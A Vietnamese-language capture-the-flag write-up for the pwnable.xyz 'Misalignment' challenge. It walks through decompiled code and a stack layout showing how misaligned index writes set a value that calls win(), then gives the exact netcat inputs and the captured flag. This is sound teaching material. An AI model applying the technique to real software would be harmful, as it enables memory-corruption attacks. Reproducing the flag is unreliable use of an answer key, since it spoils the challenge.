# Pwnable.xyz Misalignment
## Analysis
Ch&#432;&#417;ng tr&#236;nh 3 s&#7889;, trong &#273;&#243; -7 <= local_78 <= 9  
N&#7871;u  auStack_a0.\_7_8_ == 0xb000000b5 th&#236; h&#224;m win &#273;&#432;&#7907;c g&#7885;i
```
undefined8 main(void)
{
  int iVar1;
  long in_FS_OFFSET;
  undefined local_a8 [8];
  undefined auStack_a0 [24];
  long local_88;
  long local_80;
  long local_78 [13];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  memset(local_a8,0,0x98);
  auStack_a0._7_8_ = 0xdeadbeef;
  while( true ) {
    iVar1 = __isoc99_scanf("%ld %ld %ld",&local_88,&local_80,local_78);
    if (((iVar1 != 3) || (9 < local_78[0])) || (local_78[0] < -7)) break;
    *(long *)(auStack_a0 + (local_78[0] + 6) * 8) = local_80 + local_88;
    printf("Result: %ld\n",*(undefined8 *)(auStack_a0 + (local_78[0] + 6) * 8));
  }
  if (auStack_a0._7_8_ == 0xb000000b5) {
    win();
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```
&#272;&#226;y l&#224; m&#244; ph&#7887;ng gi&#225; tr&#7883; c&#7911;a auStack_a0.\_7_8_ tr&#234;n stack:
```
| ef | 00 | 00 | 00 | 00 | 00 | 00 | 00 |
| 00 | 00 | 00 | 00 | 00 | de | ad | be |
```
Nh&#432; v&#7853;y, khi local_78 l&#224; -6, 0xef c&#243; th&#7875; &#273;&#7893;i th&#224;nh 0xb5. Khi l&#224; -5, 0xdeadbe &#273;&#7893;i th&#224;nh 0xb00000
## Solution
```
└─$ nc svc.pwnable.xyz 30003
-5404319552844595200 0 -6
Result: -5404319552844595200
184549376 0 -5
Result: 184549376
a
FLAG{u_cheater_used_a_debugger}
```
## Flag
```
FLAG{u_cheater_used_a_debugger}
```